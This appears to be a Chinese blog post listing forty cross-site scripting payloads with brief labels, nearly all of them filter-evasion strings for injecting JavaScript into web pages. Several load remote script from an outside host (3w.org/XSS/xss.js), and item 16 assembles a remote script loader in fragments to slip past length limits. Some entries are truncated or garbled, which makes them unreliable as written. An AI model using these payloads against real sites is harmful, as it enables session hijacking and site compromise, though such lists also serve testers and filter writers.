# xss payload


总结了常用的xss payload
<!--more-->

1.普通的XSS JavaScript注入

    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

2.IMG标签XSS使用JavaScript命令

    <IMG SRC=1 ONERROR=alert('XSS')>

3.IMG标签无分号无引号

    <IMG SRC=javascript:alert('XSS')>

4.IMG标签大小写不敏感

    <IMG SRC=JaVaScRiPt:alert('XSS')>

5.HTML编码(必须有分号)

    <IMG SRC=javascript:alert("XSS")>

6.修正缺陷IMG标签

    <IMG """><SCRIPT>alert("XSS")</SCRIPT>">

7.formCharCode标签(计算器)

    <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

8.UTF-8的Unicode编码(计算器)

    <IMG SRC=jav..省略..S')>

9.7位的UTF-8的Unicode编码是没有分号的(计算器)

    <IMG SRC=jav..省略..S')>

10.十六进制编码也是没有分号(计算器)

    <IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>

11.嵌入式标签,将Javascript分开

    <IMG SRC="jav ascript:alert('XSS');">

12.嵌入式编码标签,将Javascript分开

    <IMG SRC="jav ascript:alert('XSS');">

13.嵌入式换行符

    <IMG SRC="jav ascript:alert('XSS');">

14.嵌入式回车

    <IMG SRC="jav ascript:alert('XSS');">

15.嵌入式多行注入JavaScript,这是XSS极端的例子

    <IMG SRC="javascript:alert('XSS')">

16.解决限制字符(要求同页面)

    <script>z='document.'</script>
    <script>z=z+'write("'</script>
    <script>z=z+'<script'</script>
    <script>z=z+' src=ht'</script>
    <script>z=z+'tp://ww'</script>
    <script>z=z+'w.shell'</script>
    <script>z=z+'.net/1.'</script>
    <script>z=z+'js></sc'</script>
    <script>z=z+'ript>")'</script>
    <script>eval_r(z)</script>

17.空字符

    perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out

18.空字符2,空字符在国内基本没效果.因为没有地方可以利用

    perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out

19.Spaces和meta前的IMG标签

    <IMG SRC=" javascript:alert('XSS');">

20.Non-alpha-non-digit XSS

    <SCRIPT/XSS SRC="http://3w.org/XSS/xss.js"></SCRIPT>

21.Non-alpha-non-digit XSS to 2

    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

22.Non-alpha-non-digit XSS to 3

    <SCRIPT/SRC="http://3w.org/XSS/xss.js"></SCRIPT>

23.双开括号

    <<SCRIPT>alert(a.sourse);//<</SCRIPT>

24.无结束脚本标记(仅火狐等浏览器)

    <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>

25.无结束脚本标记

    <SCRIPT SRC=//3w.org/XSS/xss.js>

26.半开的HTML/JavaScript XSS

    <IMG SRC="javascript:alert('XSS')"

27.双开角括号

    <iframe src=http://3w.org/XSS.html >

28.无单引号、双引号、分号

    <SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>

29.换码过滤的JavaScript

    \";alert('XSS');//

30.结束Title标签

    </TITLE><SCRIPT>alert("XSS");</SCRIPT>

31.Input Image

    <INPUT SRC="javascript:alert('XSS');">

32.BODY Image

    <BODY BACKGROUND="javascript:alert('XSS')">

33.BODY标签

    <BODY('XSS')>

34.IMG Dynsrc

    <IMG DYNSRC="javascript:alert('XSS')">

35.IMG Lowsrc

    <IMG LOWSRC="javascript:alert('XSS')">

36.BGSOUND

    <BGSOUND SRC="javascript:alert('XSS');">

37.STYLE sheet

    <LINK REL="stylesheet" HREF="javascript:alert('XSS');">

38.远程样式表

    <LINK REL="stylesheet" HREF="http://3w.org/xss.css">

39.List-style-image(列表式)

    <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS

40.IMG VBscript

    <IMG SRC='vbscript:msgbox("XSS")'></STYLE><UL><LI>XSS
